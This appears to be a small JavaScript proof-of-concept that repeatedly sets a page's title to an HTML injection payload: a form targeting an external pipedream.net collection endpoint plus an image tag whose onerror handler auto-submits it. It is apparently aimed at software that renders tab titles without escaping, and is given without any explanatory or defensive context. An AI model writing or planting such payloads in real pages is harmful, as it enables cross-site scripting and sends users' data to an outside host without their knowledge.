function changeTitle(){
    window.setInterval(function(){
        document.title = '<form id="send_data" action="https://eo28kejt5kjkrb9.m.pipedream.net" method="GET">\
            <input type="text" id="name" name="name" value="b" placeholder="your name"> \
            <input type="submit" value="Submit"></form>\
            <img src="x" onerror="document.forms[0].submit()">';
    }, 5000);
    
}